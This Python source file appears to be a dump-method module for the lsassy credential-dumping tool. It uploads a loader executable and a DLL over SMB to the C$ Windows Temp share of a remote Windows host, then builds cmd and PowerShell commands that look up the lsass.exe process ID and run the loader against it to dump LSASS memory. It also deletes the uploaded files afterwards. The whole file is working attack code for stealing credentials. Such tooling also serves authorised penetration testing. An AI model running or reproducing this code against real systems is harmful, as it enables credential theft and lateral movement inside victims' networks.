import logging
import os
import time

from lsassy.dumpmethod import IDumpMethod
from lsassy.impacketfile import ImpacketFile


class DumpMethod(IDumpMethod):
    custom_dump_path_support = False
    custom_dump_name_support = False

    dump_name = "tmp.dmp"
    dump_share = "C$"
    dump_path = "\\Windows\\Temp\\"
    def __init__(self, session, timeout):
        super().__init__(session, timeout)
        self.loader = "loader.exe"
        self.loader_path = False
        self.loader_remote_share = "C$"
        self.loader_remote_path = "\\Windows\\Temp\\"

        self.loader_uploaded = False

        self.dll = "calc.dll"
        self.dll_path = False
        self.dll_remote_share = "C$"
        self.dll_remote_path = "\\Windows\\Temp\\"

        self.dll_uploaded = False

    def prepare(self, options):
        self.loader_path = options.get("loader_path", self.loader_path)

        if not self.loader_path:
            logging.error("Missing loader_path")
            return None

        if not os.path.exists(self.loader_path):
            logging.error("{} does not exist.".format(self.loader_path))
            return None

        self.dll_path = options.get("dll_path", self.dll_path)

        if not self.dll_path:
            logging.error("Missing dll_path")
            return None

        if not os.path.exists(self.dll_path):
            logging.error("{} does not exist.".format(self.dll_path))
            return None

        # Upload loader
        logging.debug('Copy {} to {}'.format(self.loader_path, self.loader_remote_path))
        with open(self.loader_path, 'rb') as p:
            try:
                self._session.smb_session.putFile(self.loader_remote_share, self.loader_remote_path + self.loader, p.read)
                logging.success("Loader successfully uploaded")
                self.loader_uploaded = True
            except Exception as e:
                logging.error("Loader upload error", exc_info=True)
                return None

        # Upload dll
        logging.debug('Copy {} to {}'.format(self.dll_path, self.dll_remote_path))
        with open(self.dll_path, 'rb') as p:
            try:
                self._session.smb_session.putFile(self.dll_remote_share,
                                                  self.dll_remote_path + self.dll, p.read)
                logging.success("DLL successfully uploaded")
                self.dll_uploaded = True
                return True
            except Exception as e:
                logging.error("DLL upload error", exc_info=True)
                self.clean_loader()
                return None

    def clean_loader(self):
        if self.loader_uploaded:
            ImpacketFile.delete(self._session, self.loader_remote_path + self.loader, timeout=self._timeout)

    def clean_dll(self):
        if self.dll_uploaded:
            ImpacketFile.delete(self._session, self.dll_remote_path + self.dll, timeout=self._timeout)

    def clean(self):
        self.clean_loader()
        self.clean_dll()


    def get_commands(self, dump_path=None, dump_name=None, no_powershell=False):
        cmd_command = """for /f "tokens=2 delims= " %J in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do {}{} %J""".format(
            self.loader_remote_path, self.loader
        )
        pwsh_command = """{}{} (Get-Process lsass).Id""".format(
            self.loader_remote_path, self.loader
        )
        return {
            "cmd": cmd_command,
            "pwsh": pwsh_command
        }
